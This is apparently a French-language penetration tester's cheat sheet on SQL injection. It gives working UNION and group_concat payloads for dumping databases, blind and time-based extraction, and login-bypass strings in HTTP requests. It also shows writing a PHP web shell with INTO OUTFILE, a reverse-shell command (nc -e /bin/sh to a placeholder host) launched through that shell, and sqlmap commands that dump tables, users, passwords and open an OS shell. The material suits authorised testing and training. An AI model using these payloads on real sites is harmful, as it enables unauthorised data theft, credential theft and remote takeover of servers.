# SQLi

## SQLi

[http://breakthesecurity.cysecurity.org/2010/12/hacking-website-using-sql-injection-step-by-step-guide.html](http://breakthesecurity.cysecurity.org/2010/12/hacking-website-using-sql-injection-step-by-step-guide.html)

### Manual

#### Identifier le champ vulnérable

* `'`
* Operation arithmetique, vérifier si `cod=4-2` renvoie la même chose que `code=2`

#### Déterminer le nombre de colonnes

* Utiliser UNION SELECT plutot que ORDER BY
  * Identifier le nombre de colonnes et les colonnes vulnérables à l'affichage d'information : `id=-1 union select 1,2,3,4,5,6--`

#### Afficher des informations

* `version()`
* `database()`
* `user()`

#### Extraire des données basique

* WiP

#### Extraire des données death row

(**death row** -> utilisation de `group_concat()`)

* Bien positionner à **-1** (ou autre valeur entrainant l'absence de résultat)
  * Renvoie si tu ajoutes le `union select`
* Group\_concat function have a limit of 1024 characters and it will Trim the rest of characters
  * Dump **ALL the LINES** in **ONE REQUEST** with `CAST(GROUP_CONCAT() AS CHAR(<SIZE>))`
* Concaténer noms des tables de la BDD courante : `param=-1 union select 1,group_concat(table_name),3,4,5,6 from information_schema.tables where table_schema=database()--`
* Concaténer noms des colonnes de la table selectionnée : `param=-1 union select 1,group_concat(column_name),3,4,5,6 FROM information_schema.columns WHERE table_name=CHAR(100, 101, 118, 95, 97, 99, 99, 111, 117, 110, 116, 115)--`
  * CHAR() contient le nom de la table encodé
* Concaténer contenus des colonnes de la table selectionnée : `param=-1 union select 1,group_concat(<COLUMN_1>,0x3a,<COLUMN_2>),3,4,5,6 from <TABLE>--`

WiP :

* Si pas de retour sur la page --> BLIND
  * ex: panel auth
    * 1=1 : page qui indique que ça a marché
    * 2=1 : page qui indique que ça a PAS marché
    * comparer les résultats entre 1=1 et 1=2
* On peut utiliser len() pour identifier la version en BLIND, simplement en voyant le rendus de la page
* Utiliser LIKE '\_'
* SELECT INTO\_FILE

#### Extraire des données time based

* benchmark -> realise une action complique X fois
  * select benchmark(500000,MD5(xxx)) as dual where database() like '\_\_\_\_\_\_'
* sleep

```
ensuite scripter pour trouver les caractéres 1 par 1
définir un charset contenant "a-z,A-Z,1-9,-"
for c in charset
	string "" + c  + "______"
	date à 't'
	faire la requete
	date à 't+requete'
	faire la différence entre t & t+requete
	
Réexecuter le script manuellement pour chaque caractere 
	Pour chaque caractére trouvé, faire
		string "x" + c  + "_____"
			string "xy" + c  + "____"
				string "xyz" + c  + "___"
					string "xyza" + c  + "__"
						string "xyzab" + c  + "_"
							...
La comparaison peut aussi être faite en utilisatn substring()
```

* Pour time based on peut aussi faire LIKE '%'
  * tester tous les char 1 par 1 et décaler le %
    * quand sur le niém char on a testé tout le charset et que ça ne marche pas, on sait qu'on a atteint la taille max
* On peut Dump In One Shot en BLIND/TIME BASED
* mettre les noms des tables en HEXA pour eviter de mettre des quotes
* timbe based implique blind
* exemple dans une requete POST
  * `param1=xxxx&param2=xxx'||sleep(1)||'&param3=xxx`
* ERROR BASED
* Dump All In One Shot
* INTO OUTFILE (everse shell using SQL Injection)
  * Ecrire du code PHP dans un nouveau fichier .php : `mysql> Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/<PATH>/wp-content/<PATH>/<FILE>.php";`
  * Faire exécuter des commandes en les passant en paramétre au fichier .php : `https://<IP>:<PORT>/<PATH>/wp-content/<PATH>/<FILE>.php?cmd=<COMMAND>`
    * Récupérer un RS via l'exécuter de commandes du fichier .php : `?cmd=<REVERSE-SHELL>`
* SQL -> exfiltration via DNS
* leettime.com : entrainement SQLi
* rootme
* zenksecurity

#### Bypass Login:

* Champ user : `' OR 1=1 -- #`
* Champ user : `' or '1'='1`
  * `SELECT * FROM users WHERE username='$username' AND password='$password'`
* Champ user : `admin' -- -`
* Champ mdp : `1' or '1'='1`

```
POST /login-off.asp HTTP/1.1
[...]    
txtLoginID=%27+OR+1%3D1--&txtPassword=%27+OR+1%3D1--&cmdSubmit=Login    
```

* `txtLoginID=admin&txtPassword=%27+OR+1%3D1--&cmdSubmit=Login`
* `txtLoginID=%27+OR+1%3D2--&txtPassword=%27+OR+1%3D2--&cmdSubmit=Login`
* Redirection vers la page de login : `' OR 1=2--`
* Identification du nombres de colonnes : `txtLoginID=%20+UNION+SELECT+1,2,3,4--&txtPassword=%27+OR+1%3D1--&cmdSubmit=Login`
  * Si on ajoute / retire un chiffre on a une erreur 500 tout de suite, sans redirection

#### SQLi to shell

* Death row : WiP
  * Interroger le web shell : `curl -i -s -k -X $'GET' -H $'Host: 10.10.10.143' -H $'User-Agent: Mozilla/5.0' $'http://<IP>/<FILE>.php?cmd=whoami'`
  * Déployer un reverse shell : `GET /<FILE>.php?cmd=echo+'nc+-e /bin/sh <IP> <PORT>' > <FILE>.sh`
  * Ajouter les droits d'exécution : `GET /<FILE>.php?cmd=chmod +x <FILE>.sh`
  * Exécuter le reverse shell : `GET /<FILE>.php?cmd=./<FILE>.sh`

### Automated

* Confirme avec WFUZZ le nombre de colonnes (en comparrant le nombre de LINES, WORD, CHARS):
  * `wfuzz -c -b "<COOKIE_1>=<VALUE_1>; <COOKIE_2>=<VALUE_2>" -z range,1-15 "http://<IP>:<PORT>/<PATH>/<FILE>.php?tg=delegat&idx=mem&id=1 order by FUZZ"`
* ̀Déterminer les bases de données présentes : `sqlmap -u "http://<IP>/<PATH>/<FILE>.php?id=1" --dbs`
* Afficher les tables d'une base de donnée : `sqlmap -u "http://<IP>/<PATH>/<FILE>.php?id=1" -p id --tables -D <DB-name>`
* Récupérer le contenus d'une table : `sqlmap -u "http://<IP>/<PATH>/<FILE>.php?id=1" -p id -T <TABLE> --dump`
* Récupérer un shell : `sqlmap -u "http://<IP>/<PATH>/<FILE>.php?cod=1" -p <PARAM> --level 4 --risk 3 --dbms=MySQL --os-shell`
* Récupérer identifiants : `sqlmap -u 'http://<IP>/<PATH>/<FILE>.php?cod=5' --users --passwords`
* Faire la requete via burp - Copier la reqête - Sauvegarder dans un fichier .req - `sqlmap -r <FILE>.req`
  * `sqlmap -r <FILE> -p <PARAM> --force-ssl`
